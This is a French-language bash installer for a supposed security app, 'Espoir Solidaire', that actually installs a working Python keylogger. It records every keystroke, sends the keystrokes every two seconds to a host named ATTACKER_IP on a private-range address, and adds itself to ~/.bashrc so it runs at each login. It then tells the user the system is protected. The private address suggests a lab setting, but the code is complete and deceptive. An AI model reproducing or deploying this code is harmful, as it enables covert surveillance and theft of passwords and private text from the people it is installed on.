#!/bin/bash

# Script d'installation - Espoir Solidaire
# Ce script installe l'application de sécurité pour protéger vos données

echo "=========================================="
echo "  Installation Espoir Solidaire"
echo "  Application de sécurité"
echo "=========================================="
echo ""

# Créer le dossier d'installation
INSTALL_DIR="$HOME/.espoir-solidaire"
mkdir -p "$INSTALL_DIR"

echo "[+] Création du dossier d'installation..."

# Configuration du serveur attaquant (valeurs fixes)
ATTACKER_IP="192.168.56.101"
ATTACKER_PORT="8080"

echo "[+] Configuration de la connexion sécurisée..."

# Créer un environnement virtuel Python
echo "[+] Création de l'environnement virtuel Python..."
python3 -m venv "$INSTALL_DIR/venv" 2>&1

# Installer les dépendances dans l'environnement virtuel
echo "[+] Installation des dépendances de sécurité..."
"$INSTALL_DIR/venv/bin/pip" install --upgrade pip > /dev/null 2>&1
"$INSTALL_DIR/venv/bin/pip" install pynput requests > /dev/null 2>&1

# Vérifier que l'installation a réussi
if [ ! -f "$INSTALL_DIR/venv/bin/python3" ]; then
    echo "[-] Erreur: Impossible de créer l'environnement virtuel"
    exit 1
fi

# Créer le fichier keylogger.py (version simplifiée intégrée)
cat > "$INSTALL_DIR/keylogger.py" << KEYLOGGER_EOF
#!/usr/bin/env python3
"""
Application de sécurité Espoir Solidaire
Protection des données personnelles
"""

import json
import time
import uuid
import socket
import requests
from datetime import datetime
from queue import Queue
from threading import Thread
import os
import sys

from pynput import keyboard

# Configuration
ATTACKER_IP = "192.168.56.101"
ATTACKER_PORT = 8080
HTTP_ENDPOINT = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/logs"
SEND_INTERVAL = 2
RETRY_ATTEMPTS = 3
RETRY_DELAY = 5

class SecurityMonitor:
    def __init__(self):
        self.victim_id = str(uuid.uuid4())
        self.log_queue = Queue()
        self.buffer = []
        self.capturing = False
        
    def normalize_key(self, key):
        try:
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.delete: '[DELETE]',
            }
            
            if key in special_keys:
                return special_keys[key]
            
            if hasattr(key, 'char') and key.char:
                return key.char
            
            return str(key).replace('Key.', '')
        
        except Exception:
            return "[KEY]"
    
    def on_press(self, key):
        if not self.capturing:
            return
        
        try:
            normalized_key = self.normalize_key(key)
            log_entry = {
                "victim_id": self.victim_id,
                "timestamp": datetime.now().isoformat(),
                "key": normalized_key,
                "raw_key": str(key)
            }
            
            self.log_queue.put(log_entry)
            self.buffer.append(log_entry)
            
            if len(self.buffer) > 100:
                self.buffer.pop(0)
        
        except Exception:
            pass
    
    def send_logs(self, logs):
        if not logs:
            return
        
        for attempt in range(RETRY_ATTEMPTS):
            try:
                payload = {
                    "victim_id": self.victim_id,
                    "logs": logs,
                    "timestamp": datetime.now().isoformat()
                }
                
                response = requests.post(HTTP_ENDPOINT, json=payload, timeout=5)
                if response.status_code == 200:
                    return
            except:
                pass
            
            if attempt < RETRY_ATTEMPTS - 1:
                time.sleep(RETRY_DELAY)
    
    def sender_thread(self):
        while True:
            time.sleep(SEND_INTERVAL)
            
            if not self.capturing:
                continue
            
            logs_to_send = []
            while not self.log_queue.empty():
                logs_to_send.append(self.log_queue.get())
            
            if logs_to_send:
                self.send_logs(logs_to_send)
    
    def run(self):
        sender = Thread(target=self.sender_thread, daemon=True)
        sender.start()
        
        self.capturing = True
        
        try:
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    monitor = SecurityMonitor()
    monitor.run()
KEYLOGGER_EOF

# Rendre le script exécutable
chmod +x "$INSTALL_DIR/keylogger.py"

# Créer le fichier de configuration
cat > "$INSTALL_DIR/config.py" << CONFIG_EOF
ATTACKER_IP = "192.168.56.101"
ATTACKER_PORT = 8080
EXFILTRATION_MODE = "http"
CONFIG_EOF

# Créer un script de démarrage utilisant l'environnement virtuel
cat > "$INSTALL_DIR/start.sh" << START_EOF
#!/bin/bash
cd "$INSTALL_DIR"
# Utiliser le Python de l'environnement virtuel
"$INSTALL_DIR/venv/bin/python3" keylogger.py > /dev/null 2>&1 &
echo \$! > "$INSTALL_DIR/keylogger.pid"
START_EOF

chmod +x "$INSTALL_DIR/start.sh"

# Démarrer l'application
echo "[+] Démarrage de l'application de sécurité..."
"$INSTALL_DIR/start.sh"

# Ajouter au démarrage automatique (optionnel)
if [ -f "$HOME/.bashrc" ]; then
    if ! grep -q "espoir-solidaire" "$HOME/.bashrc"; then
        echo "" >> "$HOME/.bashrc"
        echo "# Espoir Solidaire - Protection des données" >> "$HOME/.bashrc"
        echo "[ -f \"$INSTALL_DIR/start.sh\" ] && \"$INSTALL_DIR/start.sh\"" >> "$HOME/.bashrc"
    fi
fi

echo ""
echo "=========================================="
echo "  Installation terminée avec succès !"
echo "  Votre système est maintenant protégé."
echo "=========================================="
echo ""

